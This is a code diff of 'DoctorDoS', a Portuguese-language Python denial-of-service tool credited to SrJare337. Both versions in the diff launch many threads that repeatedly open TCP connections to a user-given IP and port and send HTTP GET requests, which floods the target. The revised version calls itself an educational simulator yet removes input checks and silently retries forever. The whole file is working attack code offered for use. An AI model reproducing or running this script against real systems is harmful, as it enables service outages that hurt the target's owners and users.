@@ -1,81 +1,87 @@
 import socket
 import threading
-import argparse
 import time
+import argparse
+import signal
+import sys
+from colorama import Fore, Style, init
 
-# Autor: SrJare337
-# Ferramenta de DoS – Não me responsabilizo por seus usos!
+init(autoreset=True)
 
-def banner():
-    print("""
-    ##################################################
-    #                [+]DoctorDoS[+]                 #
-    #                  Desenvolvido por              #
-    #                   SrJare337                    #
-    #                                                #
-    #    Aviso: Não me responsabilizo por qualquer   #
-    #          uso indevido desta ferramenta.        #
-    ##################################################
-    """)
+print(Fore.GREEN + Style.BRIGHT + """
+  _____  
+ |  __ \ 
+ | |  | |
+ | |  | |
+ | |__| |
+ |_____/ 
+  ____  
+ / __ \ 
+| |  | |
+| |__| |
+ \____/ 
+  _____  
+ / ____| 
+| (___   
+ \___ \  
+ ____) | 
+|_____/  
+""")
 
-def parse_args():
-    parser = argparse.ArgumentParser(description="FERRAMENTA DE DOS")
-    parser.add_argument("target_ip", help="IP do alvo")
-    parser.add_argument("target_port", type=int, help="Porta do alvo")
-    parser.add_argument("--threads", type=int, default=100, help="Número de threads para o ataque")
-    parser.add_argument("--duration", type=int, default=60, help="Duração do ataque em segundos")
-    parser.add_argument("--timeout", type=int, default=5, help="Tempo limite para cada conexão em segundos")
-    return parser.parse_args()
+print(Fore.BLUE + Style.BRIGHT + "V1.0")
 
-def is_valid_ip(ip):
-    try:
-        socket.inet_aton(ip)
-        return True
-    except socket.error:
-        return False
+parser = argparse.ArgumentParser(description="Simulador de Ataque DoS para fins educacionais")
+parser.add_argument("target_ip", help="IP do alvo")
+parser.add_argument("target_port", type=int, help="Porta do alvo")
+parser.add_argument("--threads", type=int, default=100, help="Número de threads para o ataque")
+parser.add_argument("--duration", type=int, default=60, help="Duração do ataque em segundos")
 
-def attack(target_ip, target_port, timeout):
+args = parser.parse_args()
+
+def attack(target_ip, target_port):
     while True:
         try:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.settimeout(timeout)
-                s.connect((target_ip, target_port))
-                s.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
-                s.sendto(b"Host: " + bytes(target_ip, 'utf-8') + b"\r\n\r\n", (target_ip, target_port))
-        except socket.error as e:
-            print(f"Erro ao conectar: {e}")
-            break
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target_ip, target_port))
+            s.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
+            s.sendto(b"Host: " + bytes(target_ip, 'utf-8') + b"\r\n\r\n", (target_ip, target_port))
+            s.close()
+        except socket.error:
+            pass
 
-def start_attack(target_ip, target_port, num_threads, duration, timeout):
+def start_attack(target_ip, target_port, num_threads, duration):
+    print(Fore.GREEN + Style.BRIGHT + "Iniciando ataque em {}:{}".format(target_ip, target_port))
+    print(Fore.RED + Style.BRIGHT + "Número de threads: {}".format(num_threads))
+    print(Fore.YELLOW + Style.BRIGHT + "Duração do ataque: {} segundos".format(duration))
+    print(Fore.CYAN + Style.BRIGHT + "⚡ Ataque iniciado! ⚡")
+
     threads = []
-    print(f"Iniciando ataque DoS em {target_ip}:{target_port} com {num_threads} threads por {duration} segundos")
-    
     for i in range(num_threads):
-        thread = threading.Thread(target=attack, args=(target_ip, target_port, timeout))
-        thread.daemon = True
+        thread = threading.Thread(target=attack, args=(target_ip, target_port))
         thread.start()
         threads.append(thread)
-    
-    for remaining in range(duration, 0, -1):
-        print(f"Ataque em progresso. Segundos restantes: {remaining}", end="\r")
-        time.sleep(1)
+        if i % 10 == 0:
+            print(Fore.MAGENTA + Style.BRIGHT + "Thread {} iniciada...".format(i))
+
+    time.sleep(duration)
 
     for thread in threads:
-        thread.join(timeout)
-        if thread.is_alive():
-            print(f"Thread {thread.name} ainda está ativa. Forçando encerramento.")
+        thread.join()
 
-    print("Ataque concluído.")
+    print(Fore.RED + Style.BRIGHT + "Ataque finalizado. Todos os threads foram encerrados.")
+    print(Fore.CYAN + Style.BRIGHT + "⚠️ Ataque concluído! ⚠️")
 
-def main():
-    banner()
-    args = parse_args()
+def signal_handler(sig, frame):
+    print(Fore.YELLOW + Style.BRIGHT + "\nInterrupção recebida! Encerrando o ataque...")
+    print(Fore.CYAN + Style.BRIGHT + "bye bye :)")
+    sys.exit(0)
 
-    if not is_valid_ip(args.target_ip):
-        print(f"IP inválido: {args.target_ip}")
-        return
-
-    start_attack(args.target_ip, args.target_port, args.threads, args.duration, args.timeout)
+signal.signal(signal.SIGINT, signal_handler)
 
 if __name__ == "__main__":
-    main()
+    start_attack(args.target_ip, args.target_port, args.threads, args.duration)
+
+    print(Fore.GREEN + Style.BRIGHT + "\n---")
+    print(Fore.BLUE + Style.BRIGHT + "Créditos: SrJare337")
+    print(Fore.BLUE + Style.BRIGHT + "Versão: V1.0")
+    print(Fore.GREEN + Style.BRIGHT + "---")
